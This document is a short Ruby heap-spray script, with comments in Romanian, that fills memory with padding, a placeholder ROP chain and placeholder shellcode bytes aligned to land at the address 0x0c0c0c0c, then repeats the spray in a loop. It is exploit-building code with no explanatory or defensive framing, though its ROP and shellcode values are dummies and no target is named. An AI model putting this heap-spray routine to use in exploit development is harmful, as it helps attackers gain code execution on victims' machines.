$global_array = Array.new(100)
#7FB07 len of str necesar sa align blocks pt precise va blocks spray
#0bec offset pt 0c0c0c0c
#inainte formula era : "A"*0x2a902+"D" =>0x2a903 len final

def spray
	final_payload 	= ""
	offset 	  		= 0xbec
	junk 	  		= "2020"
	rop  	  		= "4141424243434444454546464747"
	shellcode 		= "0c0c00c0c0c0c0c0c0c0c0c0c0c0"
	
	while junk.length < 0x10000 
		junk += junk;
	end
	
	final_payload = junk[0,offset]
	
	final_payload += rop
	final_payload += shellcode 
	final_payload += junk[0,0x10000-offset-rop.length-shellcode.length]
	
	
	while final_payload.length < 0x80000
		final_payload += final_payload
	end
	
	for i in 0...99 do
		$global_array[i] = String.new(final_payload[0,0x7fb00])
	end
	
	for i in 0...99 do
		$global_array[i] = String.new(final_payload[0,0x7fb00])
	end
	
	for i in 0...99 do
		$global_array[i] = String.new(final_payload[0,0x7fb00])
	end
end


for i in 0...350 do
	spray
	sleep 10
end
